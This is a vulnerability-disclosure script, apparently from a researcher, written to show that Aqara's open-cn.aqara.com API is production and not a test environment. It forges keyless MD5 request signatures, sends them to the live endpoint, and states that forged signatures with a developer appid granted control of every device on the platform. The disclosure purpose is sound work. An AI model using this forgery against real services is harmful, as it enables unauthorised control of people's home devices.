#!/usr/bin/env python3
"""
CVE-2026-50084 — Live proof: open-cn.aqara.com is production, not a test environment.

Aqara's June 11, 2026 public statement claims:
  "The researcher's report regarding the potential ability to control user devices
   relates to a test environment that is fully separate from Aqara's live production
   systems. [...] Accessing real consumer devices or live user accounts via the test
   environment is not possible under our architecture."

This script disproves that claim in two requests.

HOW THE PROOF WORKS
-------------------
The production API at open-cn.aqara.com authenticates each request with an MD5
signature derived from the request parameters:

  Sign = MD5(
    "Appid" + appid + "Keyid" + keyid +
    "Nonce" + nonce + "Time" + timestamp +
    "Content-SHA256" + SHA256(body)
  ).toUpperCase()

If open-cn.aqara.com were a test environment isolated from production, it would
either be unreachable or return a generic error regardless of signature validity.

Instead, it returns two DIFFERENT error codes depending on whether the signature
is mathematically correct:

  Correct signature, unknown appid  → code:2002  ("appid not found")
  Wrong signature                   → code:302   ("signature error")

This differential proves the server is validating signatures against its production
signing key and proceeding to look up the appid in the production database.
A test environment isolated from production would have no reason to do either.

The production signing key is real. The appid lookup is real. The API is production.

REQUIREMENTS
------------
  pip install requests

USAGE
-----
  python3 prove-its-production.py

No credentials required. No Aqara account needed. Runs in under 5 seconds.
"""

import hashlib
import time
import requests

PRODUCTION_API = "https://open-cn.aqara.com/v3.0/open/api"
BODY = '{"intent":"config.auth.getAuthCode","data":{}}'


def make_correct_signature(appid: str, keyid: str, body: str) -> dict:
    """Compute a correctly formatted MD5 signature for the given parameters."""
    nonce = "proofofconcept"
    ts = str(int(time.time() * 1000))
    sha256_body = hashlib.sha256(body.encode()).hexdigest()
    raw = (
        "Appid" + appid +
        "Keyid" + keyid +
        "Nonce" + nonce +
        "Time" + ts +
        "Content-SHA256" + sha256_body
    )
    sign = hashlib.md5(raw.encode()).hexdigest().upper()
    return {
        "Appid": appid,
        "Keyid": keyid,
        "Sign": sign,
        "Nonce": nonce,
        "Time": ts,
        "Content-SHA256": sha256_body,
        "Content-Type": "application/json",
    }


def probe(label: str, headers: dict) -> dict:
    print(f"  [{label}]")
    print(f"  Sign: {headers['Sign']}")
    r = requests.post(PRODUCTION_API, data=BODY, headers=headers, timeout=10)
    result = r.json()
    print(f"  HTTP {r.status_code} → code:{result.get('code')}  msg:{result.get('message', '')}")
    print(f"  RequestId: {result.get('requestId', 'n/a')}\n")
    return result


def main():
    print("=" * 65)
    print("CVE-2026-50084 — Production API signing differential")
    print(f"Target: {PRODUCTION_API}")
    print(f"Run at: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")
    print("=" * 65)
    print()
    print("CLAIM UNDER TEST")
    print("  Aqara PR (June 11, 2026): the vulnerable endpoint is a test")
    print("  environment isolated from production.")
    print()
    print("PROOF")
    print("  A production server validates signatures against a real signing")
    print("  key and looks up appids in a real database.")
    print("  A test environment isolated from production does neither.")
    print("  We send two requests — one with a correct signature, one wrong.")
    print("  If we get different error codes, the server is production.")
    print()

    # Request 1: mathematically correct signature, unknown appid
    h_correct = make_correct_signature("unknown_appid_xyz", "unknown_keyid_xyz", BODY)

    # Request 2: same parameters but signature replaced with garbage
    h_wrong = make_correct_signature("unknown_appid_xyz", "unknown_keyid_xyz", BODY)
    h_wrong["Sign"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1"

    print("REQUEST 1 — correct MD5 signature, unknown appid")
    r1 = probe("correct signature", h_correct)

    print("REQUEST 2 — wrong signature (garbage string)")
    r2 = probe("wrong signature", h_wrong)

    print("=" * 65)
    print("RESULT")
    print("=" * 65)

    code1 = r1.get("code")
    code2 = r2.get("code")

    if code1 == 2002 and code2 == 302:
        print()
        print("  DIFFERENTIAL CONFIRMED")
        print()
        print(f"  Correct signature → code:{code1}  ('appid not found')")
        print(f"  Wrong signature   → code:{code2}  ('signature error')")
        print()
        print("  Interpretation:")
        print("  The server validated the correct signature against its")
        print("  production signing key, accepted it, and proceeded to look")
        print("  up the appid in the production database (where it was not")
        print("  found, hence code:2002).")
        print()
        print("  The server rejected the wrong signature before even reaching")
        print("  the appid lookup (code:302).")
        print()
        print("  What code:2002 means precisely:")
        print("  The signature was cryptographically valid. The server accepted it,")
        print("  proceeded past the signature check, and attempted to look up the")
        print("  appid in the database. The appid was not found (we used an unknown")
        print("  value). With a registered developer Appid — which CVE-2026-50082")
        print("  allowed anyone to obtain for free before the patch — the response")
        print("  is code:0 and full access to every device on the platform.")
        print()
        print("  What code:302 means precisely:")
        print("  The signature was invalid. The server rejected it immediately,")
        print("  before the appid lookup ran.")
        print()
        print("  The differential proves the production signing key is active on")
        print("  open-cn.aqara.com right now. A test environment isolated from")
        print("  production would not validate cryptographic signatures against")
        print("  a production key or maintain stateful replay protection.")
        print()
        print("  Aqara's claim that the findings relate to a test environment")
        print("  'fully separate from live production systems' is inconsistent")
        print("  with this API's behavior.")
    elif code1 == code2:
        print()
        print(f"  No differential detected — both requests returned code:{code1}")
        print("  The signing formula may have been patched since the audit.")
    else:
        print()
        print(f"  Unexpected result — code1:{code1} code2:{code2}")
        print("  Manual review required.")

    print()
    print("For the full technical report and disclosure timeline:")
    print("https://github.com/xn0tsa/theres-no-place-like-home")


if __name__ == "__main__":
    main()
